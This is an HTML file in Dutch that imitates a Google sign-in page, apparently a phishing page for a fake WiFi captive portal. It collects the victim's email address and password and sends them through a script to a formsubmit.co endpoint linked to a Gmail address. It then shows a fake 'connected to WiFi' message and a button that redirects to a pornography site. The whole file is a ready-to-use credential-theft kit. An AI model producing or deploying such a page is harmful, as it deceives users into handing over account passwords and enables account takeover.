<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Inloggen</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
        @media (max-width: 450px) { .box { border: none; } }
        .google-logo { height: 24px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        p { font-size: 16px; color: #202124; margin-bottom: 25px; }
        
        input { width: 100%; padding: 13px 15px; margin: 15px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border: 2px solid #1a73e8; }
        
        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        
        /* Secties */
        #passStep, #wifiSuccess { display: none; }
        
        /* WiFi Success styling */
        .wifi-icon { font-size: 50px; color: #34A853; margin-bottom: 20px; }
        .success-text { color: #202124; font-size: 18px; margin-bottom: 30px; }
    </style>
</head>
<body>

    <div class="box" id="loginBox">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
        
        <div id="emailStep">
            <h1>Inloggen</h1>
            <p>Gebruik je Google-account</p>
            <input type="email" id="emailInput" placeholder="E-mailadres of telefoonnummer" required>
            <div class="btn-container">
                <span style="color:#1a73e8; font-size:14px; font-weight:500; cursor:pointer;">Account maken</span>
                <button onclick="showPass()">Volgende</button>
            </div>
        </div>

        <div id="passStep">
            <h1>Welkom</h1>
            <div style="display:inline-flex; align-items:center; border:1px solid #dadce0; padding:4px 12px; border-radius:15px; font-size:14px; margin-bottom:20px;">
                <span id="displayEmail"></span>
            </div>
            
            <form id="finalForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
                <input type="hidden" name="email" id="hiddenEmail">
                <input type="password" name="password" id="passInput" placeholder="Wachtwoord opgeven" required>
                <div class="btn-container">
                    <span style="color:#1a73e8; font-size:14px; font-weight:500;">Wachtwoord vergeten?</span>
                    <button type="submit">Volgende</button>
                </div>
            </form>
        </div>
    </div>

    <div class="box" id="wifiSuccess">
        <div class="wifi-icon">✔</div>
        <h1>Verbonden!</h1>
        <p class="success-text">U bent nu succesvol aangemeld bij het WiFi-netwerk.</p>
        
        <button onclick="window.location.href='https://pornhub.com'" style="width:100%;">
            Klik hier om verder te gaan
        </button>
    </div>

    <script>
        function showPass() {
            const email = document.getElementById('emailInput').value;
            if(!email.includes('@')) { alert("Vul een geldig e-mailadres in."); return; }
            
            document.getElementById('emailStep').style.display = 'none';
            document.getElementById('passStep').style.display = 'block';
            document.getElementById('displayEmail').innerText = email;
            document.getElementById('hiddenEmail').value = email;
        }

        document.getElementById('finalForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Gegevens versturen naar jouw email
            fetch(this.action, {
                method: 'POST',
                body: new FormData(this)
            }).then(() => {
                // Na het sturen: Laat het WiFi succes scherm zien
                document.getElementById('loginBox').style.display = 'none';
                document.getElementById('wifiSuccess').style.display = 'block';
            });
        });
    </script>
</body>
</html>
